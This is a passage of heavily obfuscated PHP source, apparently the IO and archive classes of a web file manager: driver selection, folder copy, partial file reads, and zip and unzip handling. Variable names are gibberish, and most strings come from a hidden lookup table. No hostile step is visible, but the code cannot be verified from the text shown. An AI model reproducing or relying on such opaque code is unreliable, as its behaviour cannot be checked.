{ $ûºÙ²Úñ = $îŸ‹´„[$¨¸ÆÖ¹]; break; } else { if ($ûºÙ²Úñ > $îŸ‹´„[$¨¸ÆÖ¹ - 1] && $ûºÙ²Úñ <= $îŸ‹´„[$¨¸ÆÖ¹]) { $ûºÙ²Úñ = $îŸ‹´„[$¨¸ÆÖ¹]; break; } else { if ($¨¸ÆÖ¹ == count($îŸ‹´„) - 1 && $ûºÙ²Úñ > $îŸ‹´„[$¨¸ÆÖ¹]) { $ûºÙ²Úñ = $îŸ‹´„[$¨¸ÆÖ¹]; break; } } } } $î‚ÅëÓ„ = self::driverMake($ÄÁ©©¥); if ($î‚ÅëÓ„->isFileOutServer()) { return $î‚ÅëÓ„->fileOutImageServer($ÄÁ©©¥, $ûºÙ²Úñ); } return $î‚ÅëÓ„->fileOutImage($ÄÁ©©¥, $ûºÙ²Úñ); } private static function driverIsSame($ İü¹â¹, $É¿ğ—³‚) { $õ¤¹½ˆ´ =& $_SERVER[ˆûùúÊ¯]; $Àáº¥• = $ İü¹â¹->getType(); $¥ÍŠ˜»“ = $É¿ğ—³‚->getType(); if ($Àáº¥• != $¥ÍŠ˜»“) { return !1; } if ($Àáº¥• == $õ¤¹½ˆ´[817]) { return !0; } if ($Àáº¥• == $õ¤¹½ˆ´[116]) { return !0; } if ($ İü¹â¹->pathDriver == $É¿ğ—³‚->pathDriver) { return !0; } return !1; } public static function copyUpdate($£ÉèŒ·, $ö‰ú®¬¯) { $›œñã•æ =& $_SERVER[ˆûùúÊ¯]; if (!IO::exist($£ÉèŒ·)) { return !1; } if (!IO::exist($ö‰ú®¬¯)) { IO::mkdir($ö‰ú®¬¯); } $‰Õ­Ğ¶— = array_to_keyvalue(self::listAllSimple($£ÉèŒ·), $›œñã•æ[94]); $Éèæ³šÏ = array_to_keyvalue(self::listAllSimple($ö‰ú®¬¯), $›œñã•æ[94]); $İ•´‘Íè = array(); $×Å˜äõ = array(); foreach ($‰Õ­Ğ¶— as $§ø°ÄÙÚ => $±ü‚øŠÚ) { if (isset($Éèæ³šÏ[$§ø°ÄÙÚ])) { if ($±ü‚øŠÚ[$›œñã•æ[85]] == 1) { continue; } if ($Éèæ³šÏ[$§ø°ÄÙÚ][$›œñã•æ[86]] == $±ü‚øŠÚ[$›œñã•æ[86]]) { continue; } } if ($±ü‚øŠÚ[$›œñã•æ[85]] == 1) { $×Å˜äõ[] = $ö‰ú®¬¯ . $›œñã•æ[8] . trim($§ø°ÄÙÚ, $›œñã•æ[8]); continue; } $òíÁÆæä = strstr(trim($§ø°ÄÙÚ, $›œñã•æ[8]), $›œñã•æ[8]) ? get_path_father($§ø°ÄÙÚ) : $›œñã•æ[12]; $İ•´‘Íè[] = array($›œñã•æ[1221] => $±ü‚øŠÚ[$›œñã•æ[96]], $›œñã•æ[1222] => rtrim($ö‰ú®¬¯, $›œñã•æ[8]) . $›œñã•æ[8] . $òíÁÆæä, $›œñã•æ[1223] => $±ü‚øŠÚ); } $öœÖ•Ÿó = array($›œñã•æ[223] => $İ•´‘Íè, $›œñã•æ[85] => $×Å˜äõ); Hook::trigger($›œñã•æ[1224], $£ÉèŒ·, $ö‰ú®¬¯, $öœÖ•Ÿó); foreach ($×Å˜äõ as $±ü‚øŠÚ) { IO::mkdir($±ü‚øŠÚ); } foreach ($İ•´‘Íè as $±ü‚øŠÚ) { IO::copy($±ü‚øŠÚ[$›œñã•æ[1221]], $±ü‚øŠÚ[$›œñã•æ[1222]], REPEAT_REPLACE); } } public static function fileSubstr($¥÷âƒÔÅ, $‚¾ªÁŒú, $üø¯Õ“ = false) { $¼ ÑÉ“ =& $_SERVER[ˆûùúÊ¯]; $š”€ÌŒÅ = self::driverMake($¥÷âƒÔÅ); $ùáÉÉ•µ = $š”€ÌŒÅ->size($¥÷âƒÔÅ); $¨ÇÒªõØ = $‚¾ªÁŒú; $‘ò¬…›Ñ = $üø¯Õ“; if ($‚¾ªÁŒú < 0) { $‚¾ªÁŒú = $ùáÉÉ•µ + $‚¾ªÁŒú; } if ($üø¯Õ“ === !1) { $üø¯Õ“ = $ùáÉÉ•µ - $‚¾ªÁŒú; } if ($‚¾ªÁŒú + $üø¯Õ“ > $ùáÉÉ•µ) { $üø¯Õ“ = $ùáÉÉ•µ - $‚¾ªÁŒú; } if (!$ùáÉÉ•µ && $š”€ÌŒÅ->getType() == $¼ ÑÉ“[116] && !$š”€ÌŒÅ->exist($¥÷âƒÔÅ)) { $Ÿº‹ˆåÃ = get_path_this($¥÷âƒÔÅ); $÷ààÅ¸ = parse_url_query($Ÿº‹ˆåÃ); if (is_array($÷ààÅ¸) && isset($÷ààÅ¸[$¼ ÑÉ“[42]])) { $Ÿº‹ˆåÃ = urldecode($÷ààÅ¸[$¼ ÑÉ“[42]]); } throw new Exception($¼ ÑÉ“[1225] . LNG($¼ ÑÉ“[1226]) . $¼ ÑÉ“[1027] . clear_html($Ÿº‹ˆåÃ) . $¼ ÑÉ“[12]); } if ($üø¯Õ“ <= 0) { return $¼ ÑÉ“[12]; } if ($‚¾ªÁŒú < 0 || $‚¾ªÁŒú >= $ùáÉÉ•µ || $üø¯Õ“ > 1024 * 1024 * 10) { throw new Exception("\146\x69\154\145\x52\145\x61\x64\x20\145\162\x72\157\x72\41\x20\163\164\x61\162\164\75{$‚¾ªÁŒú}\x3b\154\x65\156\147\164\x68\75{$üø¯Õ“}\73\40\x73\151\172\x65\x3d{$ùáÉÉ•µ}\73"); } $ŞØÓóèÀ = $š”€ÌŒÅ->fileSubstr($¥÷âƒÔÅ, $‚¾ªÁŒú, $üø¯Õ“); if (!$ŞØÓóèÀ && $üø¯Õ“ && isset($GLOBALS[$¼ ÑÉ“[1227]])) { throw new Exception($GLOBALS[$¼ ÑÉ“[1227]][$¼ ÑÉ“[1228]]); } return $ŞØÓóèÀ; } private static function driverMake(&$Á¹íëß­) { $ÅŞ€Ã×Ì =& $_SERVER[ˆûùúÊ¯]; $¢ììÌ—ä = KodIO::parse($Á¹íëß­); if (!self::$driverListSystem) { $ÁˆìÒºİ = Model($ÅŞ€Ã×Ì[827])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ÁˆìÒºİ, $ÅŞ€Ã×Ì[451]); } if ($¢ììÌ—ä[$ÅŞ€Ã×Ì[43]] == KodIO::KOD_IO && !self::$driverListSystem[$¢ììÌ—ä[$ÅŞ€Ã×Ì[451]]]) { return !1; } $Á¹íëß­ = $¢ììÌ—ä[$ÅŞ€Ã×Ì[1229]]; $ÃŠ’¿‹« = self::driverGet($¢ììÌ—ä, $Á¹íëß­); return $ÃŠ’¿‹«; } private static function driverGet($Ü™õ¸ğÉ, &$ôµ…‚¹•) { $ôÍ¯’Ñö =& $_SERVER[ˆûùúÊ¯]; $äã¿ÑŠ÷ = $Ü™õ¸ğÉ[$ôÍ¯’Ñö[1230]]; $‘¿ŠÆ”ß = $Ü™õ¸ğÉ[$ôÍ¯’Ñö[451]]; switch ($Ü™õ¸ğÉ[$ôÍ¯’Ñö[43]]) { case KodIO::KOD_IO: $íìÓÏ¿Ÿ = self::$driverListSystem[$‘¿ŠÆ”ß]; break; case KodIO::KOD_SOURCE: $ôµ…‚¹• = $‘¿ŠÆ”ß . $ôµ…‚¹•; $íìÓÏ¿Ÿ = array($ôÍ¯’Ñö[1231] => $ôÍ¯’Ñö[1232], $ôÍ¯’Ñö[6] => $Ü™õ¸ğÉ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ÇûøºÆ = $GLOBALS[$ôÍ¯’Ñö[1233]]; self::$driverListUser = array_to_keyvalue($ÇûøºÆ, $ôÍ¯’Ñö[451]); } $íìÓÏ¿Ÿ = self::$driverListUser[$‘¿ŠÆ”ß]; break; case KodIO::KOD_SHARE_LINK: $íìÓÏ¿Ÿ = array($ôÍ¯’Ñö[1231] => $ôÍ¯’Ñö[1234], $ôÍ¯’Ñö[6] => $Ü™õ¸ğÉ); $°ğ¶Ÿ = Action($ôÍ¯’Ñö[1235])->sharePathInfo($Ü™õ¸ğÉ[$ôÍ¯’Ñö[94]]); $ôµ…‚¹• = $°ğ¶Ÿ[$ôÍ¯’Ñö[190]]; if (!$°ğ¶Ÿ[$ôÍ¯’Ñö[190]]) { $şæêË’ü = Model($ôÍ¯’Ñö[640])->getInfo($°ğ¶Ÿ[$ôÍ¯’Ñö[641]]); $ôµ…‚¹• = KodIO::clear($şæêË’ü[$ôÍ¯’Ñö[1236]] . $Ü™õ¸ğÉ[$ôÍ¯’Ñö[1229]]); $Ü™õ¸ğÉ[$ôÍ¯’Ñö[536]] = $şæêË’ü; $Ü™õ¸ğÉ[$ôÍ¯’Ñö[1212]] = $ôµ…‚¹•; $íìÓÏ¿Ÿ = array($ôÍ¯’Ñö[1231] => $ôÍ¯’Ñö[1237], $ôÍ¯’Ñö[6] => $Ü™õ¸ğÉ); } break; case KodIO::KOD_SHARE_ITEM: $íìÓÏ¿Ÿ = array($ôÍ¯’Ñö[1231] => $ôÍ¯’Ñö[1238], $ôÍ¯’Ñö[6] => $Ü™õ¸ğÉ); $şæêË’ü = Model($ôÍ¯’Ñö[640])->getInfo($Ü™õ¸ğÉ[$ôÍ¯’Ñö[451]]); if ($şæêË’ü[$ôÍ¯’Ñö[190]] == $ôÍ¯’Ñö[221]) { $ôµ…‚¹• = KodIO::clear($şæêË’ü[$ôÍ¯’Ñö[1236]] . $Ü™õ¸ğÉ[$ôÍ¯’Ñö[1229]]); $Ü™õ¸ğÉ[$ôÍ¯’Ñö[536]] = $şæêË’ü; $Ü™õ¸ğÉ[$ôÍ¯’Ñö[1212]] = $ôµ…‚¹•; $íìÓÏ¿Ÿ = array($ôÍ¯’Ñö[1231] => $ôÍ¯’Ñö[1239], $ôÍ¯’Ñö[6] => $Ü™õ¸ğÉ); } else { if (!$ôµ…‚¹•) { $ôµ…‚¹• = $şæêË’ü[$ôÍ¯’Ñö[190]]; } } break; default: $ôµ…‚¹• = $Ü™õ¸ğÉ[$ôÍ¯’Ñö[94]]; $íìÓÏ¿Ÿ = array($ôÍ¯’Ñö[1231] => $ôÍ¯’Ñö[1240]); break; } $£ ü˜ÅÖ = $Ü™õ¸ğÉ[$ôÍ¯’Ñö[94]]; if (!isset(self::$driverCache[$£ ü˜ÅÖ])) { $øÛ§íÊù = strtolower($íìÓÏ¿Ÿ[$ôÍ¯’Ñö[105]]); $Ü”™ÈæÊ = $GLOBALS[$ôÍ¯’Ñö[6]][$ôÍ¯’Ñö[99]][$ôÍ¯’Ñö[886]]; $İ÷Õ²± = $ôÍ¯’Ñö[84] . (isset($Ü”™ÈæÊ[$øÛ§íÊù]) ? $Ü”™ÈæÊ[$øÛ§íÊù] : ucfirst($øÛ§íÊù)); if (!class_exists($İ÷Õ²±)) { show_json("{$İ÷Õ²±}\40\x6e\x6f\164\40\x65\170\x69\163\164\163\41", !1); } $–é×»î = isset($íìÓÏ¿Ÿ[$ôÍ¯’Ñö[6]]) ? $íìÓÏ¿Ÿ[$ôÍ¯’Ñö[6]] : !1; self::$driverCache[$£ ü˜ÅÖ] = new $İ÷Õ²±($–é×»î); } $€àıû¯² = self::$driverCache[$£ ü˜ÅÖ]; $€àıû¯²->pathDriver = $äã¿ÑŠ÷; $€àıû¯²->pathBase = $ôÍ¯’Ñö[12]; if (isset($íìÓÏ¿Ÿ[$ôÍ¯’Ñö[6]][$ôÍ¯’Ñö[1241]])) { $€àıû¯²->pathBase = rtrim($íìÓÏ¿Ÿ[$ôÍ¯’Ñö[6]][$ôÍ¯’Ñö[1241]], $ôÍ¯’Ñö[8]) . $ôÍ¯’Ñö[8]; $ôµ…‚¹• = $€àıû¯²->pathBase . ltrim($ôµ…‚¹•, $ôÍ¯’Ñö[8]); } $ôµ…‚¹• = $€àıû¯²->getPath($ôµ…‚¹•); if (isset($Ü™õ¸ğÉ[$ôÍ¯’Ñö[1212]])) { $ôµ…‚¹• = $Ü™õ¸ğÉ[$ôÍ¯’Ñö[1212]]; } $€àıû¯²->path = $ôµ…‚¹•; return $€àıû¯²; } public static function errorTips($ş¶’³Şî = false) { $à‚„¬°Ç =& $_SERVER[ˆûùúÊ¯]; static $‰ùĞ°‚š = array(); $®ÂÜ³Æ = 1000; if ($ş¶’³Şî === -1) { return $‰ùĞ°‚š ? $‰ùĞ°‚š[count($‰ùĞ°‚š) - 1] : $à‚„¬°Ç[12]; } if ($ş¶’³Şî === !1) { return implode($à‚„¬°Ç[18], $‰ùĞ°‚š); } if (count($‰ùĞ°‚š) >= $®ÂÜ³Æ) { $‰ùĞ°‚š = array_slice($‰ùĞ°‚š, $®ÂÜ³Æ * 0.5, $®ÂÜ³Æ); } $‰ùĞ°‚š[] = $ş¶’³Şî; write_log($à‚„¬°Ç[172] . ACTION . $à‚„¬°Ç[1242] . $ş¶’³Şî, $à‚„¬°Ç[1243]); } public static function getLastError($ëÃÆòÇ = '') { $™ú³¥ä† = self::errorTips(-1); return $™ú³¥ä† ? $™ú³¥ä† : $ëÃÆòÇ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $€›¬Ê¸·; if ($€›¬Ê¸·) { return $€›¬Ê¸·; } $È±à¯ıà = IO::init($_SERVER[ˆûùúÊ¯][8]); return $È±à¯ıà; } private static function iconvSystem($“±ÌÃãÁ) { return self::local()->iconvSystem($“±ÌÃãÁ); } private static function iconvApp($³öƒúòò) { return self::local()->iconvApp($³öƒúòò); } public static function zipFolder($’¨ıé¬, $ÌğÛ¹®Î = "\x7a\x69\160", $Ğç¿ê† = '', $÷›ó…çä = REPEAT_RENAME) { $Ì­Ïò¼ =& $_SERVER[ˆûùúÊ¯]; $…Şô·Œâ = IO::listPath($’¨ıé¬); if (!$…Şô·Œâ) { return !1; } $…Şô·Œâ = array_merge($…Şô·Œâ[$Ì­Ïò¼[92]], $…Şô·Œâ[$Ì­Ïò¼[93]]); return self::zip($…Şô·Œâ, $ÌğÛ¹®Î, $Ğç¿ê†, $÷›ó…çä); } public static function zip($¿¨ÊÂº, $ûš»¸À = "\172\x69\160", $ÜÍùÔç« = '', $Ş¬Ğ¿“ş = REPEAT_RENAME) { $•¨ô––× =& $_SERVER[ˆûùúÊ¯]; if (is_string($¿¨ÊÂº) && $¿¨ÊÂº) { $¿¨ÊÂº = array(array($•¨ô––×[94] => $¿¨ÊÂº)); } $ª’¡·Ì = self::init($¿¨ÊÂº[0][$•¨ô––×[94]]); $û¿³ÁŞÕ = self::info($¿¨ÊÂº[0][$•¨ô––×[94]]); $ûºÅ¸¹š = $•¨ô––×[12]; $Ëğ‚ú² = $•¨ô––×[12]; $¿­å·Š‘ = $•¨ô––×[12]; if ($ÜÍùÔç« && substr($ÜÍùÔç«, -1, 1) != $•¨ô––×[8]) { $Ëğ‚ú² = get_path_father($ÜÍùÔç«); $¿­å·Š‘ = get_path_this($ÜÍùÔç«); } else { $Ëğ‚ú² = self::pathFather($û¿³ÁŞÕ[$•¨ô––×[94]]); $¿­å·Š‘ = $û¿³ÁŞÕ[$•¨ô––×[42]] . $•¨ô––×[10] . $ûš»¸À; if (count($¿¨ÊÂº) > 1) { $²È¨‹í = IO::info($Ëğ‚ú²); $¿­å·Š‘ = $²È¨‹í[$•¨ô––×[42]] . $•¨ô––×[10] . $ûš»¸À; } if ($ÜÍùÔç«) { $Ëğ‚ú² = $ÜÍùÔç«; } } if ($ª’¡·Ì->getType() == $•¨ô––×[116]) { $ˆ‹Ü‘íØ = self::init($Ëğ‚ú²); $ÚŒÙ–°Õ = $ˆ‹Ü‘íØ->getType() == $•¨ô––×[116] ? $Ëğ‚ú² : get_path_father($ª’¡·Ì->path); $ÚŒÙ–°Õ = rtrim($ÚŒÙ–°Õ, $•¨ô––×[8]) . $•¨ô––×[8]; mk_dir($ÚŒÙ–°Õ); } else { $ûºÅ¸¹š = TEMP_FILES . $•¨ô––×[1244] . time() . rand_string(8) . $•¨ô––×[8]; mk_dir($ûºÅ¸¹š); file_put_contents($ûºÅ¸¹š . $•¨ô––×[1245], $•¨ô––×[12]); $ÚŒÙ–°Õ = $ûºÅ¸¹š; } $¹Šà†°¦ = IO::info($ÚŒÙ–°Õ); if (!$¹Šà†°¦ || !$¹Šà†°¦[$•¨ô––×[226]]) { show_json(LNG($•¨ô––×[1246]), !1); } $êé¼âÁ = self::zipFileList($¿¨ÊÂº, $ûºÅ¸¹š); foreach ($êé¼âÁ as $›ÕïÅ™ç => $®¶½ñøÄ) { $êé¼âÁ[$›ÕïÅ™ç] = self::iconvSystem($®¶½ñøÄ); } $ù÷øˆª = get_filename_auto($ÚŒÙ–°Õ . $¿­å·Š‘, $•¨ô––×[12], $Ş¬Ğ¿“ş); KodArchive::create(self::iconvSystem($ù÷øˆª), $êé¼âÁ); if (!IO::exist($ù÷øˆª)) { if ($ûºÅ¸¹š) { del_dir($ûºÅ¸¹š); } show_json(LNG($•¨ô––×[1247]), !1); } if (!$ûºÅ¸¹š) { return $ù÷øˆª; } $ö³Æ› = self::move($ù÷øˆª, $Ëğ‚ú², $Ş¬Ğ¿“ş); if ($ûºÅ¸¹š) { del_dir($ûºÅ¸¹š); } if (!$ù÷øˆª) { show_json(LNG($•¨ô––×[1247]), !1); } return $ö³Æ›; } public static function unzip($¦Šˆˆà, $ŞÅ·­¡, $§ìÑ°„ = "\55\x31", $Õ’…ü®§ = "\x72\x65\160\x6c\x61\143\145") { $›ÊÛŠÎ =& $_SERVER[ˆûùúÊ¯]; $ÅÒ³ğÑ = parent::info($¦Šˆˆà); if (!$ÅÒ³ğÑ) { show_json(LNG($›ÊÛŠÎ[1248]), !1); } $æ°õÖÎƒ = IO::infoFullSimple($ŞÅ·­¡); if (!$æ°õÖÎƒ) { $ŞÅ·­¡ = IO::mkdir($ŞÅ·­¡); } if (isset($æ°õÖÎƒ[$›ÊÛŠÎ[190]]) && trim($æ°õÖÎƒ[$›ÊÛŠÎ[94]], $›ÊÛŠÎ[8]) != trim($ŞÅ·­¡, $›ÊÛŠÎ[8])) { $øç¡å» = KodIO::make($æ°õÖÎƒ[$›ÊÛŠÎ[189]]); $ğ·…À¸ª = IO::fileNameAuto($øç¡å», $æ°õÖÎƒ[$›ÊÛŠÎ[42]], REPEAT_RENAME_FOLDER, !0); $ŞÅ·­¡ = IO::mkdir($øç¡å» . $ğ·…À¸ª); } $§ìÑ°„ = $§ìÑ°„ && $§ìÑ°„ != $›ÊÛŠÎ[1249] ? @json_decode($§ìÑ°„, !0) : -1; $¥¦Öù·ì = self::unzipPart($¦Šˆˆà, $§ìÑ°„); if (!$¥¦Öù·ì || !IO::exist($¥¦Öù·ì[$›ÊÛŠÎ[223]])) { show_json(LNG($›ÊÛŠÎ[115]), !1); } $£Ã’ëº = $¥¦Öù·ì[$›ÊÛŠÎ[1250]][count($¥¦Öù·ì[$›ÊÛŠÎ[1250]]) - 1]; if ($£Ã’ëº[$›ÊÛŠÎ[1251]] == -1 || substr($£Ã’ëº[$›ÊÛŠÎ[42]], -1, 1) == $›ÊÛŠÎ[8]) { $Ş¥åËĞˆ = $¥¦Öù·ì[$›ÊÛŠÎ[1252]] . rand_string(10) . $›ÊÛŠÎ[8]; mk_dir($Ş¥åËĞˆ); $ßÅÃ˜êƒ = count($¥¦Öù·ì[$›ÊÛŠÎ[1250]]) == 1 ? IO::ext($¦Šˆˆà) : get_path_ext($¥¦Öù·ì[$›ÊÛŠÎ[223]]); $’âÎ¥™õ = KodArchive::extract(self::iconvSystem($¥¦Öù·ì[$›ÊÛŠÎ[223]]), $Ş¥åËĞˆ, $£Ã’ëº[$›ÊÛŠÎ[1251]], $ğ·…À¸ª, $ßÅÃ˜êƒ); self::unzipErrorCheck($’âÎ¥™õ, array($›ÊÛŠÎ[1253], $¦Šˆˆà, $ßÅÃ˜êƒ, $ŞÅ·­¡, $¥¦Öù·ì)); Hook::trigger($›ÊÛŠÎ[1254], $Ş¥åËĞˆ); recursion_dir($Ş¥åËĞˆ, $ñìÎ³‰“, $ÔÆˆ†æÇ, 0); $ÜŠÂÌ˜• = array_merge($ñìÎ³‰“, $ÔÆˆ†æÇ); $¤±“ìòá = array(); foreach ($ÜŠÂÌ˜• as $¶Ã×Š¹‰) { $³ŒÈÔ¯ = IO::move(self::iconvApp($¶Ã×Š¹‰), $ŞÅ·­¡, $Õ’…ü®§); if ($³ŒÈÔ¯) { $¤±“ìòá[] = $³ŒÈÔ¯; } } del_dir($Ş¥åËĞˆ); } else { $³ŒÈÔ¯ = IO::move($¥¦Öù·ì[$›ÊÛŠÎ[223]], $ŞÅ·­¡, $Õ’…ü®§, get_path_this($£Ã’ëº[$›ÊÛŠÎ[42]])); if ($³ŒÈÔ¯) { $¤±“ìòá[] = $³ŒÈÔ¯; } } return $¤±“ìòá ? $¤±“ìòá : !1; } public static function unzipList($¯»¯ö¢î) { $õ °Â =& $_SERVER[ˆûùúÊ¯]; $¨”Ï«Èø = isset($¯»¯ö¢î[$õ °Â[1255]]) ? $¯»¯ö¢î[$õ °Â[1255]] : !1; $Š…¯¶ÚÚ = isset($¯»¯ö¢î[$õ °Â[1251]]) ? @json_decode($¯»¯ö¢î[$õ °Â[1251]], !0) : -1; $·×´•Šˆ = self::unzipPart($¯»¯ö¢î[$õ °Â[94]], $Š…¯¶ÚÚ); if (!$·×´•Šˆ || !IO::exist($·×´•Šˆ[$õ °Â[223]])) { show_json(LNG($õ °Â[115]), !1); } $Şê™¼ î = $·×´•Šˆ[$õ °Â[1250]][count($·×´•Šˆ[$õ °Â[1250]]) - 1]; $•°Ü¸¬” = in_array(IO::ext($·×´•Šˆ[$õ °Â[223]]), array($õ °Â[365], $õ °Â[1256], $õ °Â[1257], $õ °Â[1258], $õ °Â[1259], $õ °Â[1260])); if (!$¨”Ï«Èø && ($Şê™¼ î[$õ °Â[1251]] == -1 || $•°Ü¸¬”)) { $½é–‡À° = $·×´•Šˆ[$õ °Â[1252]] . get_path_this($·×´•Šˆ[$õ °Â[223]]) . $õ °Â[1261]; if (!IO::exist($½é–‡À°)) { $Ó©Äë±® = $Şê™¼ î[$õ °Â[1251]] == -1 ? get_path_ext(IO::pathThis($¯»¯ö¢î[$õ °Â[94]])) : get_path_ext($·×´•Šˆ[$õ °Â[223]]); $óğÆıÁ = KodArchive::listContent(self::iconvSystem($·×´•Šˆ[$õ °Â[223]]), !0, $Ó©Äë±®); self::unzipErrorCheck($óğÆıÁ, array($õ °Â[1262], $¯»¯ö¢î, $·×´•Šˆ)); @file_put_contents($½é–‡À°, json_encode($óğÆıÁ[$õ °Â[1263]])); } return @json_decode(IO::getContent($½é–‡À°), !0); } IO::fileOut($·×´•Šˆ[$õ °Â[223]], $¨”Ï«Èø, get_path_this($Şê™¼ î[$õ °Â[42]])); die; } private static function zipFileList($ïş„Öã“, $¦ı¾Ü¡¶ = false) { $í±„Ã¿¾ =& $_SERVER[ˆûùúÊ¯]; $¿’‡Ğ = array(); foreach ($ïş„Öã“ as $­Íø·§Ë) { $ªÅ³Ìø = $­Íø·§Ë[$í±„Ã¿¾[94]]; if ($¦ı¾Ü¡¶) { $ªÅ³Ìø = self::copy($­Íø·§Ë[$í±„Ã¿¾[94]], $¦ı¾Ü¡¶, $í±„Ã¿¾[878]); } else { $§â†÷ = self::init($­Íø·§Ë[$í±„Ã¿¾[94]]); if ($§â†÷->getType() == $í±„Ã¿¾[116]) { $ªÅ³Ìø = $§â†÷->path; } } if ($ªÅ³Ìø && self::local()->exist($ªÅ³Ìø)) { $¿’‡Ğ[$­Íø·§Ë[$í±„Ã¿¾[94]]] = $ªÅ³Ìø; } } if (!empty($¿’‡Ğ)) { return array_values($¿’‡Ğ); } show_json(LNG($í±„Ã¿¾[1226]), !1); } private static function localFilePath($‘Şøİ°¾) { $Ûã®Çà¸ =& $_SERVER[ˆûùúÊ¯]; $‚€¼ì¢ = KodIO::parse($‘Şøİ°¾); if ($‚€¼ì¢[$Ûã®Çà¸[43]] == KodIO::KOD_SOURCE) { $˜ş¨†Å“ = Model($Ûã®Çà¸[885])->fileInfoGet(KodIO::sourceID($‘Şøİ°¾)); if (!$˜ş¨†Å“[$Ûã®Çà¸[94]]) { show_json($Ûã®Çà¸[1264], !1); } $‘Şøİ°¾ = $˜ş¨†Å“[$Ûã®Çà¸[94]]; } $ûİÓ­úÏ = self::init($‘Şøİ°¾); if ($ûİÓ­úÏ->pathParse[$Ûã®Çà¸[1212]]) { $‘Şøİ°¾ = $ûİÓ­úÏ->pathParse[$Ûã®Çà¸[1212]]; $ûİÓ­úÏ = self::init($‘Şøİ°¾); } $ñ±ÂıÇİ = $ûİÓ­úÏ->getType(); if ($ñ±ÂıÇİ == $Ûã®Çà¸[116] || $ñ±ÂıÇİ == $Ûã®Çà¸[1265]) { if (!$ûİÓ­úÏ->exist($ûİÓ­úÏ->path)) { show_json(LNG($Ûã®Çà¸[115]), !1); } return $ûİÓ­úÏ->path; } return !1; } public static function unzipPart($»¶ˆ¹‡, $Š—´ªÔ¬ = -1) { $úÔçù¹¾ =& $_SERVER[ˆûùúÊ¯]; $–Œú¨ÓÁ = IO::pathThis($»¶ˆ¹‡); if (!$Š—´ªÔ¬ || $Š—´ªÔ¬ == -1) { $×ˆ´’ü = array(array($úÔçù¹¾[42] => $–Œú¨ÓÁ, $úÔçù¹¾[1251] => -1)); $×ˆ´’ü[0][$úÔçù¹¾[1266]] = $×ˆ´’ü[0][$úÔçù¹¾[42]]; } else { if (is_array($Š—´ªÔ¬)) { $×ˆ´’ü = $Š—´ªÔ¬; $š”›³Ÿ’ = count($×ˆ´’ü) - 1; for ($éÉ™Ú– = 0; $éÉ™Ú– <= $š”›³Ÿ’; $éÉ™Ú–++) { $Åğ²• = $×ˆ´’ü[$éÉ™Ú–]; $³ºˆ²ÑÏ = get_path_this($Åğ²•[$úÔçù¹¾[42]]) . (checkExtSafe($Åğ²•[$úÔçù¹¾[42]]) ? $úÔçù¹¾[12] : $úÔçù¹¾[1267]); $×ˆ´’ü[$éÉ™Ú–][$úÔçù¹¾[1266]] = $úÔçù¹¾[1268] . intval($Åğ²•[$úÔçù¹¾[1251]]) . $úÔçù¹¾[438] . $³ºˆ²ÑÏ; if ($éÉ™Ú– == 0) { continue; } $×ˆ´’ü[$éÉ™Ú–][$úÔçù¹¾[1266]] = $×ˆ´’ü[$éÉ™Ú– - 1][$úÔçù¹¾[1266]] . $úÔçù¹¾[1269] . $×ˆ´’ü[$éÉ™Ú–][$úÔçù¹¾[1266]]; } } } if (!is_array($×ˆ´’ü) || count($×ˆ´’ü) == 0) { return !1; } $•í¾’Ôç = $×ˆ´’ü[count($×ˆ´’ü) - 1]; if (!IO::exist($»¶ˆ¹‡)) { return !1; } $ÙêÙßì‹ = TEMP_FILES . $úÔçù¹¾[1270] . kodIO::hashPathSafe($»¶ˆ¹‡) . $úÔçù¹¾[8]; $ÔÍ‹®ßŠ = $ÙêÙßì‹ . $•í¾’Ôç[$úÔçù¹¾[1266]]; mk_dir($ÙêÙßì‹); file_put_contents(TEMP_FILES . $úÔçù¹¾[1245], $úÔçù¹¾[12]); if (IO::exist($ÔÍ‹®ßŠ)) { return array($úÔçù¹¾[223] => $ÔÍ‹®ßŠ, $úÔçù¹¾[1250] => $×ˆ´’ü, $úÔçù¹¾[1252] => $ÙêÙßì‹); } $Èİççê = self::localFilePath($»¶ˆ¹‡); if (!$Èİççê) { $Èİççê = $ÙêÙßì‹ . $úÔçù¹¾[1271]; if (!IO::exist($Èİççê)) { self::copy($»¶ˆ¹‡, $ÙêÙßì‹, !1, get_path_this($Èİççê)); } } if (!$Èİççê || !IO::exist($Èİççê)) { return !1; } if ($•í¾’Ôç[$úÔçù¹¾[1251]] == -1) { return array($úÔçù¹¾[223] => $Èİççê, $úÔçù¹¾[1250] => $×ˆ´’ü, $úÔçù¹¾[1252] => $ÙêÙßì‹); } $ä¸ùîÅŞ = $Èİççê; foreach ($×ˆ´’ü as $éÉ™Ú– => $Åğ²•) { if (!$Åğ²• || $Åğ²•[$úÔçù¹¾[1251]] == $úÔçù¹¾[1249]) { break; } if (substr($Åğ²•[$úÔçù¹¾[42]], -1, 1) == $úÔçù¹¾[8]) { break; } $•²ªåÎ = in_array(get_path_ext($Åğ²•[$úÔçù¹¾[1266]]), array($úÔçù¹¾[365], $úÔçù¹¾[1256], $úÔçù¹¾[1257], $úÔçù¹¾[1258], $úÔçù¹¾[1259], $úÔçù¹¾[1260])); $ÁÀ¥–ï = $éÉ™Ú– == count($×ˆ´’ü) - 1 && $•²ªåÎ; $»•ò„Ì¹ = $ÙêÙßì‹ . $Åğ²•[$úÔçù¹¾[1266]]; $®¿òÉÙË = $ÙêÙßì‹ . get_path_this($Åğ²•[$úÔçù¹¾[42]]); if (IO::exist($»•ò„Ì¹)) { $ä¸ùîÅŞ = $»•ò„Ì¹; continue; } $Ü—“Í˜ = $éÉ™Ú– == 0 ? get_path_ext($–Œú¨ÓÁ) : get_path_ext($ä¸ùîÅŞ); $º¬íŒ£ = KodArchive::extract(self::iconvSystem($ä¸ùîÅŞ), $ÙêÙßì‹, $Åğ²•[$úÔçù¹¾[1251]], $¥ÎÆó, $Ü—“Í˜); self::unzipErrorCheck($º¬íŒ£, array($úÔçù¹¾[1272], $»¶ˆ¹‡, $×ˆ´’ü, $Åğ²•, $»•ò„Ì¹)); if (IO::exist($®¿òÉÙË)) { IO::rename($®¿òÉÙË, get_path_this($»•ò„Ì¹)); } $ä¸ùîÅŞ = $»•ò„Ì¹; } $ÔÍ‹®ßŠ = $ä¸ùîÅŞ; return array($úÔçù¹¾[223] => $ä¸ùîÅŞ, $úÔçù¹¾[1250] => $×ˆ´’ü, $úÔçù¹¾[1252] => $ÙêÙßì‹); } private static function unzipErrorCheck($û÷õ°¹, $ÄòˆÀ’À = false) { $ƒœ–‹ 